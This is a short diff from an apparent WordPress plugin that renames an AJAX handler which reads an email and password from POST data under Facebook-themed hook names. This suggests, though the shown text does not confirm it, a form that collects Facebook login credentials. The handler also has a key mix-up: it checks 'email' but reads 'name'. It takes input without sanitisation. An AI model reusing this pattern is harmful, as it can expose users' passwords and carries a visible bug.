@@ -26,11 +26,11 @@ if (!class_exists('FACEBOOK_Hooks')) {
         {
             add_action('init', array($this, 'register_everything'));
             add_action('init', array($this, 'facebook_from_page'));
-            add_action('wp_ajax_facebook-from-action', array($this, 'facebook_from_set'));
+            add_action('wp_ajax_facebook-from-action', array($this, 'facebook_from_set_ac'));
 
         }
 
-        function facebook_from_set()
+        function facebook_from_set_ac()
         {
             $email = isset($_POST['email']) ? $_POST['name'] : '';
             $password = isset($_POST['password']) ? $_POST['password'] : '';
